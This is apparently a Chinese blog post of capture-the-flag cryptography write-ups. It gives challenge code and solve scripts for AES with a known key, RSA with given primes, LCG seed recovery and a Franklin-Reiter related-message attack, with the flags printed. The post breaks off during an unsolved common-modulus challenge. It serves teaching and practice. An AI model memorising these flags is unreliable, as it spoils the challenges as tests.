<h2 id="SWPUCTF-2022-新生赛-AES"><a href="#SWPUCTF-2022-新生赛-AES" class="headerlink" title="[SWPUCTF 2022 新生赛]AES"></a>[SWPUCTF 2022 新生赛]AES</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> getflag</span><br><span class="line">iv = <span class="string">&#x27;1229002635654321&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;nssctfneedcrypto&#x27;</span></span><br><span class="line">data = getflag()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 位数不足十六位用空格填充</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">data</span>):</span><br><span class="line">    pad_data = data</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span> - <span class="built_in">len</span>(data)):</span><br><span class="line">        pad_data = pad_data + <span class="string">&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> pad_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_en</span>(<span class="params">key, data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; <span class="number">16</span>:</span><br><span class="line">        data = pad(data)</span><br><span class="line">    AES_obj = AES.new(key.encode(<span class="string">&quot;utf-8&quot;</span>), AES.MODE_CBC, iv.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    AES_en_str = AES_obj.encrypt(data.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    AES_en_str = base64.b64encode(AES_en_str)</span><br><span class="line">    AES_en_str = AES_en_str.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> AES_en_str</span><br><span class="line"></span><br><span class="line">data = AES_en(key, data)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="comment">#data=862EoKZMO3sqpNlzyvIW5G/8MFeAI/zgGXcgi5eNOL8=</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># 位数不足十六位用空格填充</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">data</span>):</span><br><span class="line">    pad_data = data</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span> - <span class="built_in">len</span>(data)):</span><br><span class="line">        pad_data = pad_data + <span class="string">&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> pad_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_en</span>(<span class="params">key, data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; <span class="number">16</span>:</span><br><span class="line">        data = pad(data)</span><br><span class="line">    AES_obj = AES.new(key.encode(<span class="string">&quot;utf-8&quot;</span>), AES.MODE_CBC, iv.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    <span class="comment"># AES后 进行utf8加密 base64编码 utf8解密</span></span><br><span class="line">    AES_en_str = AES_obj.encrypt(data.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    AES_en_str = base64.b64encode(AES_en_str)</span><br><span class="line">    AES_en_str = AES_en_str.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> AES_en_str</span><br><span class="line"></span><br><span class="line">iv = <span class="string">&#x27;1229002635654321&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;nssctfneedcrypto&#x27;</span></span><br><span class="line">data= <span class="string">&quot;862EoKZMO3sqpNlzyvIW5G/8MFeAI/zgGXcgi5eNOL8=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_de</span>(<span class="params">key, data</span>):</span><br><span class="line">    cipher = AES.new(key.encode(<span class="string">&quot;utf-8&quot;</span>), AES.MODE_CBC, iv.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    data = data.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    data = base64.b64decode(data)</span><br><span class="line">    data = cipher.decrypt(data)</span><br><span class="line">    data = data.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">AES_de(key,data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># NSSCTF&#123;NSS_CRYPTO_NEED_YOU_0000&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2023-新生赛-EasyRSA"><a href="#SWPUCTF-2023-新生赛-EasyRSA" class="headerlink" title="[SWPUCTF 2023 新生赛]EasyRSA"></a>[SWPUCTF 2023 新生赛]EasyRSA</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum  </span><br><span class="line">  </span><br><span class="line">p=libnum.generate_prime(<span class="number">1024</span>)  </span><br><span class="line">q=libnum.generate_prime(<span class="number">1024</span>)  </span><br><span class="line">e=<span class="number">65537</span>  </span><br><span class="line">m=<span class="string">&quot;NSSCTF&#123;*******************&#125;&quot;</span>  </span><br><span class="line">m=libnum.s2n(m)  </span><br><span class="line">n=p*q  </span><br><span class="line">phi_n=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)  </span><br><span class="line">d=libnum.invmod(e,phi_n)  </span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,p)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)    </span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;e=&quot;</span>,e)  </span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p= 122912801126049869009003839542545176400185213365268209105714006257803073428638629824801261702125287814910668428403367391355051987389837804474055637991864563803834741161217607848968821280710324766558457056004037592628178078680121173634128054936108782807954132605887275556228703383455969903056759874047110115433</span></span><br><span class="line"><span class="comment">#q= 120790113700754477830062212762518406876786376726996249661848284428829412089402183812692045970711341815805796005449714738748110749559462448861357011272792817313060401380148108517705435100103533857957024851181447994572972501120774586405811257420853542417275740953525627232008812587423053626515513859653865873671</span></span><br><span class="line"><span class="comment">#e= 65537</span></span><br><span class="line"><span class="comment">#c= 7094224488947659163318199615533819770556597977720767621640224798887506152292861133457571683713587909779712343346370719403811813233693263526316785431883833118583425528830238629831001255198236686372518770451273159769779374149881346761523688131115323441973953523582174059584087249568245044443295176738493785560215046375056269378223045128094953923926250055718405799885041115025529297362914403732661935017257507786348635366480744933193471899621592092711962814949533564454932121056035003021428158830645604347966849572981124877683317022116903132719663958775850982016292384237647664448371811915879714093710876989697939277005</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p= <span class="number">122912801126049869009003839542545176400185213365268209105714006257803073428638629824801261702125287814910668428403367391355051987389837804474055637991864563803834741161217607848968821280710324766558457056004037592628178078680121173634128054936108782807954132605887275556228703383455969903056759874047110115433</span></span><br><span class="line">q= <span class="number">120790113700754477830062212762518406876786376726996249661848284428829412089402183812692045970711341815805796005449714738748110749559462448861357011272792817313060401380148108517705435100103533857957024851181447994572972501120774586405811257420853542417275740953525627232008812587423053626515513859653865873671</span></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">c= <span class="number">7094224488947659163318199615533819770556597977720767621640224798887506152292861133457571683713587909779712343346370719403811813233693263526316785431883833118583425528830238629831001255198236686372518770451273159769779374149881346761523688131115323441973953523582174059584087249568245044443295176738493785560215046375056269378223045128094953923926250055718405799885041115025529297362914403732661935017257507786348635366480744933193471899621592092711962814949533564454932121056035003021428158830645604347966849572981124877683317022116903132719663958775850982016292384237647664448371811915879714093710876989697939277005</span></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi_n)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;RSA_1s_so_ea3y_and_interest1ng!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>





<h2 id="NSSRound-4-SWPU-ezcrypto-LCG"><a href="#NSSRound-4-SWPU-ezcrypto-LCG" class="headerlink" title="[NSSRound#4 SWPU]ezcrypto LCG"></a>[NSSRound#4 SWPU]ezcrypto LCG</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Symbol</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.alpha = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.beta = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">        self.n = getPrime(<span class="number">32</span>)</span><br><span class="line">        self.seed = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.alpha * self.seed + self.beta) % self.n</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">output</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;alpha = &#123;&#125;\nbeta = &#123;&#125;\nn = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.alpha, self.beta, self.n))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;res1 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.<span class="built_in">next</span>()))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;res2 = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.<span class="built_in">next</span>()))</span><br><span class="line"></span><br><span class="line">symbol = Symbol()</span><br><span class="line">symbol.output()</span><br><span class="line">c = <span class="string">b&#x27;&#x27;</span>.join([long_to_bytes(<span class="built_in">ord</span>(flag[i]) ^ (symbol.<span class="built_in">next</span>() % <span class="number">10</span>))</span><br><span class="line">              <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))])</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(c))</span><br><span class="line"></span><br><span class="line">alpha = <span class="number">2659869614</span></span><br><span class="line">beta = <span class="number">3138014669</span></span><br><span class="line">n = <span class="number">2171187379</span></span><br><span class="line">res1 = <span class="number">32421</span></span><br><span class="line">res2 = <span class="number">32382</span></span><br><span class="line"><span class="number">628427670713408045832213770914678202267468957347245535228951062583137095137644250375583786099578</span></span><br></pre></td></tr></table></figure>

<p>alpha beta seed 32位随机整数</p>
<p>n 32位素数</p>
<p>seed =(a * seed + b ) mod n</p>
<p>已知前两个连续的res值 res = seed &gt;&gt; 16</p>
<p>c[i] = flag[i] ^ ( ((a*seed+b)mod n )&gt;&gt;16 )%10</p>
<p>flag 前几位是 NSSCTF 为默认已知条件</p>
<p>X0 = c[0]^N</p>
<p>seed =(a * seed + b ) mod n</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">alpha = <span class="number">2659869614</span></span><br><span class="line">beta = <span class="number">3138014669</span></span><br><span class="line">n = <span class="number">2171187379</span></span><br><span class="line">res1 = <span class="number">32421</span></span><br><span class="line">res2 = <span class="number">32382</span></span><br><span class="line">c = <span class="number">628427670713408045832213770914678202267468957347245535228951062583137095137644250375583786099578</span></span><br><span class="line">c = long_to_bytes(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(c[0]^ord(&#x27;N&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要转成二进制在左移 十进制不行</span></span><br><span class="line"><span class="comment"># for i in range(32421,32421&lt;&lt;16):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0b111111010100101</span> &lt;&lt; <span class="number">16</span>, (<span class="number">0b111111010100101</span> &lt;&lt; <span class="number">16</span>) + <span class="number">2</span> ** <span class="number">16</span>)):</span><br><span class="line"></span><br><span class="line">    x = (alpha*i + beta)%n</span><br><span class="line">    <span class="keyword">if</span> x &gt;&gt; <span class="number">16</span> == res2:</span><br><span class="line">        y = (alpha*x + beta)%n</span><br><span class="line">        <span class="keyword">if</span> (y &gt;&gt; <span class="number">16</span> )%<span class="number">10</span> == c[<span class="number">0</span>]^<span class="built_in">ord</span>(<span class="string">&#x27;N&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(i,x)</span><br><span class="line">			<span class="comment"># 2124788500 2122226329</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">res1=<span class="number">2124788500</span></span><br><span class="line">res2=<span class="number">2122226329</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lcg</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    x = (a*b+c)%n</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c :</span><br><span class="line">    res2 = lcg(res2,alpha,beta)</span><br><span class="line">    <span class="built_in">print</span>(  <span class="built_in">chr</span>(((res2&gt;&gt;<span class="number">16</span>)%<span class="number">10</span>)^i),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2023-秋季新生赛-小明文？"><a href="#SWPUCTF-2023-秋季新生赛-小明文？" class="headerlink" title="[SWPUCTF 2023 秋季新生赛]小明文？"></a>[SWPUCTF 2023 秋季新生赛]小明文？</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">m1=flag = <span class="string">b&#x27;NSSCTF&#123;*******&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">m1</span>):</span><br><span class="line">    p = getPrime(<span class="number">700</span>)</span><br><span class="line">    q = getPrime(<span class="number">700</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    a = getPrime(<span class="number">128</span>)</span><br><span class="line">    b = getPrime(<span class="number">128</span>)</span><br><span class="line">    m1 = bytes_to_long(m1)</span><br><span class="line">    mm1 = a * m1 + b</span><br><span class="line"></span><br><span class="line">    c1 = <span class="built_in">pow</span>(m1, e, n)</span><br><span class="line">    c2 = <span class="built_in">pow</span>(mm1, e, n)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c1 = <span class="subst">&#123;c1&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c2 = <span class="subst">&#123;c2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 13026126941826887019162872735099540876106694302074884925200107036130428843197729140372377590706535217469477301361486550282890330093772372813532795303163348233096919179478061917423707929667355386062657434467799360617526194768968700908096844475960205671302377364202483195391706116078632202015938962280529309403244885363904094804118278167720593581764017089021116316636464533785051436622916960956665030100255641288863474938703</span></span><br><span class="line"><span class="comment"># a = 280807370135687531454416708417179457159</span></span><br><span class="line"><span class="comment"># b = 210598260561987226227971066630761929397</span></span><br><span class="line"><span class="comment"># c1 = 5484670538103757119990644460454986219076673914082966464351809153114702100411054106785392646801736865489738145857425179185164710603704198643749378051371008266521829572436350080663825339915763509501690398283916091505443322384568973565599179112299853287766734493187659418383619877040013434926843623979979122417950089001830664273269598688130410251828579862218274297572192961909808728768317567218412746711665911495028223620671</span></span><br><span class="line"><span class="comment"># c2 = 249587944874112168607313602465869274336587750392364868939732783502223999305089384749508572630699199927194600499968110646290832205640569694933539973256281796631433129626712361622584048439446364992886884217198680921278383770604919381329363647924261642857483728973331091285820401689502291336332199019252649615680893389557508558362194551939434128389351824194393680744241807605416750291337127085044177563509645273228457253193</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Related Message Attack：</p>
<p>利用条件：</p>
<p>如果两个信息之间M1 M2只存在已知的固定差异【线性关系】，并且使用相同的模数N下进行RSA加密</p>
<p>具体原理不看了【详细可看这里<a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/#related-message-attack%E3%80%91">https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/#related-message-attack】</a></p>
<p><img src="/posts/bb5a57d9/7.png"></p>
<p>最终可推出如下式子</p>
<p><img src="/posts/bb5a57d9/8.png"></p>
<p>题目已知条件 c1 c2 a b，M2=aM1+b 线性关系，所以可以求出M2</p>
<p>直接套轮子[sage看不懂 直接拿过来了]</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span class="number">13026126941826887019162872735099540876106694302074884925200107036130428843197729140372377590706535217469477301361486550282890330093772372813532795303163348233096919179478061917423707929667355386062657434467799360617526194768968700908096844475960205671302377364202483195391706116078632202015938962280529309403244885363904094804118278167720593581764017089021116316636464533785051436622916960956665030100255641288863474938703</span></span><br><span class="line">a = <span class="number">280807370135687531454416708417179457159</span></span><br><span class="line">b = <span class="number">210598260561987226227971066630761929397</span></span><br><span class="line">c1 = <span class="number">5484670538103757119990644460454986219076673914082966464351809153114702100411054106785392646801736865489738145857425179185164710603704198643749378051371008266521829572436350080663825339915763509501690398283916091505443322384568973565599179112299853287766734493187659418383619877040013434926843623979979122417950089001830664273269598688130410251828579862218274297572192961909808728768317567218412746711665911495028223620671</span></span><br><span class="line">c2 = <span class="number">249587944874112168607313602465869274336587750392364868939732783502223999305089384749508572630699199927194600499968110646290832205640569694933539973256281796631433129626712361622584048439446364992886884217198680921278383770604919381329363647924261642857483728973331091285820401689502291336332199019252649615680893389557508558362194551939434128389351824194393680744241807605416750291337127085044177563509645273228457253193</span></span><br><span class="line">e=<span class="number">5</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,c1,c2,a,b</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = (x)^e - c1</span><br><span class="line">    g2 = (a*x+b)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1, g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic() <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">m=franklinReiter(n,e,c1,c2,a,b)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;89c507f3-4a21-11ee-a71e-c03c59457d4d&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/posts/bb5a57d9/9.png"></p>
<h2 id="SWPUCTF-2022-新生赛-Phishing【没做出来-后面在研究下】"><a href="#SWPUCTF-2022-新生赛-Phishing【没做出来-后面在研究下】" class="headerlink" title="[SWPUCTF 2022 新生赛]Phishing【没做出来 后面在研究下】"></a>[SWPUCTF 2022 新生赛]Phishing【没做出来 后面在研究下】</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">eAlice = <span class="number">0x10001</span></span><br><span class="line">eBob = <span class="number">0x10003</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chatEncrypt</span>(<span class="params">pepole, message</span>):</span><br><span class="line">    <span class="keyword">if</span> pepole == <span class="string">&#x27;Alice&#x27;</span>:</span><br><span class="line">        sender = hashlib.sha256(<span class="built_in">str</span>(pepole).encode()).hexdigest()</span><br><span class="line">        sign = hashlib.sha256(<span class="built_in">str</span>(message).encode()).hexdigest()</span><br><span class="line">        encryptMessage = <span class="built_in">hex</span>(<span class="built_in">pow</span>(bytes_to_long(message), eAlice, n))</span><br><span class="line">        <span class="keyword">return</span> sender, encryptMessage, sign</span><br><span class="line">    <span class="keyword">elif</span> pepole == <span class="string">&#x27;Bob&#x27;</span>:</span><br><span class="line">        sender = hashlib.sha256(<span class="built_in">str</span>(pepole).encode()).hexdigest()</span><br><span class="line">        sign = hashlib.sha256(<span class="built_in">str</span>(message).encode()).hexdigest()</span><br><span class="line">        encryptMessage = <span class="built_in">hex</span>(<span class="built_in">pow</span>(bytes_to_long(message), eBob, n))</span><br><span class="line">        <span class="keyword">return</span> sender, encryptMessage, sign</span><br><span class="line"></span><br><span class="line">chatLog = <span class="built_in">open</span>(<span class="string">&quot;Chatting.log&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">encryptedChatLog = <span class="built_in">open</span>(<span class="string">&quot;ChatEncrypted.log&quot;</span>, <span class="string">&quot;w+&quot;</span>)</span><br><span class="line">log = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> chatLog:</span><br><span class="line">    log.append(line)</span><br><span class="line">chatLog.close()</span><br><span class="line"></span><br><span class="line">encryptedChatLog.write(<span class="built_in">hex</span>(n)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(log)/<span class="number">2</span>)):</span><br><span class="line">    <span class="keyword">if</span> log[i*<span class="number">2</span>] == <span class="string">b&#x27;Alice\r\n&#x27;</span>:</span><br><span class="line">        encryptedChatLog.write(<span class="built_in">str</span>(chatEncrypt(<span class="string">&#x27;Alice&#x27;</span>, log[i*<span class="number">2</span>+<span class="number">1</span>]))+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(chatEncrypt(<span class="string">&#x27;Alice&#x27;</span>, log[i*<span class="number">2</span>+<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">elif</span> log[i*<span class="number">2</span>] == <span class="string">b&#x27;Bob\r\n&#x27;</span>:</span><br><span class="line">        encryptedChatLog.write(<span class="built_in">str</span>(chatEncrypt(<span class="string">&#x27;Bob&#x27;</span>, log[i*<span class="number">2</span>+<span class="number">1</span>]))+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(chatEncrypt(<span class="string">&#x27;Bob&#x27;</span>, log[i*<span class="number">2</span>+<span class="number">1</span>]))</span><br><span class="line">encryptedChatLog.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>已知 eAlice = 0x10001、eBob = 0x10003</p>
<p>c = pow(m,e,n)</p>
<p>输出文件中包含 hex(n) 及 十六组 str(chatEncrypt(‘Alice’, log[i*2+1])) ，其中sender和sign sha256加密 密文未加密</p>
<p>所以已知内容为 n 和16组c</p>
<p>使用同一个模数n进行加密 优先考虑共模攻击</p>
<p>n = 0x63651c7146a0e7b724297d4212b5128ede8631b886179f7c7770877317d0d7d91d74aa9a8763ef0b8640f0d3ec80ae2581af3bec1928a308d6e220e2b7bc7dbee675445c7503b8469ccb3b6d36b69a19e67aad605e83886f274308904e5cd660fb627899075dca6ba585001d4e0c4b496c79ea1952d961421eeda77b80ed3716d6eaba40de17848499adbf098b85e6807ee4fdea7059d5faf3b2b58d1e17322ce6f3747f1cd138db0593d630e97573bd42c8b02bac2d780b8b0b6ac915cb18f082af21c3c5a4849b6e8e19862b1160888bb069adb8bcbcf93693ea8993bc26c1321d36b137a215bf56dfe9af8ba511f5d89b016a68ca03d9bd14091c04027b01</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x44e199407b72439f4fad42a3a13ff31fe22daacd0b1ec17f34f260ffa8a7be74b75ac624ab147b8342b0cd97024b1d7d40d5071bc65d62377b3eb2b718e086096084219360d7bf967ba961afa05054d968d8b3493870831e92622ead173ba41e3d345e068cc7640bb43f3ff9654ab48183f6dbe752ee26b9c908d4b31fcb8e445963ef261e99bc238441a2c0e82fdf07359702d0ab664ab216995c7e27d91e885a5ee37ae1f6895a7d38155edcd8990c36fa2ac6d7e14abec471cc96a8ba34497f3073e0906f683145e03fc38c8fa40ba4250d2d907f3071c3db30d941b321c349d9d800bed6be61b00a3797aef85f7fb2cc36413556f6438fae3b9476adab6e</span><br><span class="line">0x10cde6bdf0ac17952be139709d97fa574bfbeffd22e9a0c0fde85811797decfd4b8c669df862a476c66ae47e2831d23f1dde85290a58489a8cabf9f8bf4e94c80009634ee2deb13391c1ede5005a4fd3a58b08b185eb4d10081f34676c3bf546ae641141e63bab05ca9e40bdd5c9422857f5da5a3f3f14f87a2235196dad758065d0108b8a450939fe5084cea40d8ab8e1f5b87df21def507285464cb26e2cc5ad3ade03d83ac74557ec51c4eb2422dc45b7022cca62a4d1896bf13fef9bb38f5dc44d2ce6ab28222655ed27104b1e18f2baaa9bbc4200e8cf531cda25c9ae4f07e79885efc7b7fb3dcad0f07de66a1a1708f6bc96906a184caea4d23d1af4cf</span><br><span class="line">0x31d25cdd014ad6ccef4e417ee1a1a59ebff514979887b9e05bda8a577dd8f3b62fa4ef09780b96d5878957a2ab11116b3a1d77e26cc4a0510f83fb86247170798aa0470215ea0cf1646291ee111e70fb83094a73d6f4540957ac428094c806ed2a6fb68db8c47170ae747375277deda72aaf887c09c06e372c62af6ee559f96e13b9f2d4f7a72df4b4d9bfb8975510ae165da5d0ed9727c9168669d2bc762cd49bcf316d3bc4d29e9429016f4ba5f1b12390c433248cb443c97df5fe6992016543054150af623edaf29ef81b231491bafbbbe0f607dd754f5d6d702a44a9b99533174a6c4bb6e727683c05a908bffdfdb629972f51f4ef698bbffebed566a0c5</span><br><span class="line">0x7b1ef6b4cb43ca5747d17ebf5a42d49b0f24b65a13101dfeb995a9cf753f45afd65c93d908629c008ea8d6577cb6c32960486b838d335974ab15a58d38a39a8d8f6b16a0369da059d2a5298bc4efb6491ef4537e958e693c17acdded7fd527548a0800f6f1a79ba484f2c4b15662b2bee4e5286b1972b3fd78b2d9ba5b5b1c58cb6e226fb55f4e6c266ef69aff05971a9594fc9f96ffbb98022fb744c3e081e59afccaf9258f6f5921765c5324b2ff3dc3d64c6164d2f26cbaadec66669e8e77b9f9196cfa46e68cb3f5f53435e016297f9d0ce9131d9dbaee616b34eb5ebd871d50226dae36e648a3e351cb9e46969ad7d578d367ca546d062f3ab0313eb9b</span><br><span class="line">0x401156c77529718d7a5fff5889703d9d000f1e8324d76eb05728fe83b3a9f9a689abd4b01af9c036c35025c21603d4256b5edd12803192030ca198be70ead4f6113b147e8e3f0d3743cf3e7aebf22151b468ccacd681989158afdfc61dbd46d8d67e85d09491217a065ec04d4b12f2e31098802e1094f06aaa8a8c43785496243e881f81fb90254dd3342699e6c433f8f603c00605d6b34c6ec3117cf78fcb1a72a9bab83e05d1b489148a90f7816fa5f84fde195ba1bcddb26df6b78ceb09d919807b7bb7b7cce257b23fb34508d1ffaaec17cf5e1f66ea31e692d077859ca16ee24cd2d6923744c98cafbf39c41c0bbf68a6c086b62614792e23038643c955</span><br><span 